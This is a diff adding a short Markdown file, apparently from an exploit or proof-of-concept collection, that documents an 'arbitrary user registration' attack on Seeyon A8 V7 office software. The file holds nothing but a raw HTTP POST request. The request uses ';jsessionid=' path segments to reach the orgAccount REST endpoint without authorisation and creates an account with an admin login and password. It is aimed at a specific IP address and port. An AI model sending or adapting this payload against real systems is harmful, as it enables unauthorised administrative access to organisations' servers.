@@ -1,0 +1,13 @@
+# 致远A8V7任意用户注册
+POST /seeyon/rest/orgAccount;jsessionid=/ofdServlet;jsessionid=portalManager.do?method=smsLoginEnabled HTTP/1.1
+Host: 119.253.49.25:8007
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 189
+Content-Type: application/json
+
+{"code":"16","sortId":"8","name":"addAccount6","description":"xxxxxxd","admin":[{"password":"helloqwe123!@#","loginName":"zhangwei1"}],"shortName":"test6","Superior":"-1730833917365171641"}
